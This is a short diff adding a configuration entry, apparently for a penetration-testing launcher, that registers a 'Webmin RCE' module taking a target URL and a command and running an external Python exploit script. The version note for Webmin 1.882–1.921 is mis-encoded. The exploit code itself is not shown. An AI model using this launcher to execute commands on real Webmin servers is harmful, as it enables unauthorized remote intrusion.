@@ -1,0 +1,9 @@
+<sfjt>inject</sfjt>
+<cs1mc>Url</cs1mc>
+<cs2mc>Command</cs2mc>
+<zbz>1</zbz>
+<bz1>
+<cmd>cmd /c python Webadmin_RCE.py "<cs1/>" "<cs2/>"</cmd>
+</bz1>
+<bz>Webmin RCE
+°æ±¾£º1.882 - 1.921</bz>
